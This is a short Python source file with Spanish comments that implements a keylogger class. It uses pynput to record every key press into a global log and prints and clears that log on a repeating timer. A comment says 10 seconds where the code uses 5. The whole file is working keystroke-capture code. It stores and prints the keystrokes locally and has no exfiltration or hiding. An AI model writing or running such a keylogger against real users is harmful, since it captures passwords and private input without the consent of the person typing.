import pynput
import threading

log = ""

class Keylogger:

    def tecla_presionada(self,key):
        global log
        try:
            log = log + str(key.char)
        except:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "
              # Muestra el texto entero 



    def reporte(self):
        global log 
        print(log)
        log = ""
        timer = threading.Timer(5, self.reporte) #Cada 10 segundos se ejecuta la función reporte. Con while loop daría problemas. 
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.tecla_presionada)
        with keyboard_listener:
            self.reporte()
            keyboard_listener.join()
